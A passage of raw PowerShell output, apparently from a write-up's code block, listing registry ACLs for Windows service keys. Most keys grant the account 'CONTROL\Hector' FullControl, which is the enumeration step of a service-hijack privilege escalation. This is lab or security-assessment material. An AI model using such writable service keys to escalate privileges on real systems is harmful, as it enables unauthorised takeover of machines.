Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmgid</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmhgfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmhgfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicguestinterface</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicguestinterface</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicheartbeat</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicheartbeat</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmickvpexchange</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmickvpexchange</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicrdv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicrdv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicshutdown</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicshutdown</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmictimesync</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmictimesync</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicvmsession</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicvmsession</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicvss</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmicvss</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VMMemCtl</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VMMemCtl</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmmouse</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmmouse</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmrawdsk</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmrawdsk</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VMTools</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VMTools</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmusbmouse</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmusbmouse</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmvss</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmvss</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmwefifw</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmwefifw</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmxnet3ndis6</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vmxnet3ndis6</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\volmgr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\volmgr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\volmgrx</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\volmgrx</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\volsnap</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\volsnap</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\volume</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\volume</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vpci</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vpci</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VPCMap</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VPCMap</span><br><span class="line">AccessToString          : BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Power Users Allow  SetValue, CreateSubKey, Delete, ReadKey</span><br><span class="line">                          BUILTIN\Power Users Allow  -1073676288</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vsmraid</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vsmraid</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vsock</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vsock</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VSS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VSS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VSTXRAID</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\VSTXRAID</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vwifibus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\vwifibus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\W32Time</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\W32Time</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\w3logsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\w3logsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\W3SVC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\W3SVC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WaaSMedicSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WaaSMedicSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WacomPen</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WacomPen</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WalletService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WalletService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wanarp</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wanarp</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wanarpv6</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wanarpv6</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WarpJITSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WarpJITSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WAS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WAS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WbioSrvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WbioSrvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wcifs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wcifs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Wcmsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Wcmsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wcnfs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wcnfs</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdBoot</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdBoot</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Wdf01000</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Wdf01000</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdFilter</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdFilter</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdiServiceHost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdiServiceHost</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdiSystemHost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdiSystemHost</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdmCompanionFilter</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdmCompanionFilter</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdNisDrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdNisDrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdNisSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WdNisSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Wecsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Wecsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WEPHOSTSVC</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WEPHOSTSVC</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wercplsupport</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\wercplsupport</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\WerSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : 